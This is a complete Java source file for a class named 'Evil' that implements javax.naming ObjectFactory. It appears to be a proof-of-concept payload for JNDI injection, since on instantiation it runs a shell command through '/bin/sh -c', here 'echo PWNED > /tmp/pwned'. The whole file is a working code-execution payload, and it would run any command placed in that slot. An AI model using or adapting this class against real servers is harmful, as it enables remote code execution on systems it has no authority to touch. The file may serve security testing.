import io.github.pixee.security.SystemCommand;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public  class Evil implements  ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo PWNED > /tmp/pwned"
        };
        SystemCommand.runCommand(Runtime.getRuntime(), cmd);
        return  null;
    }
}
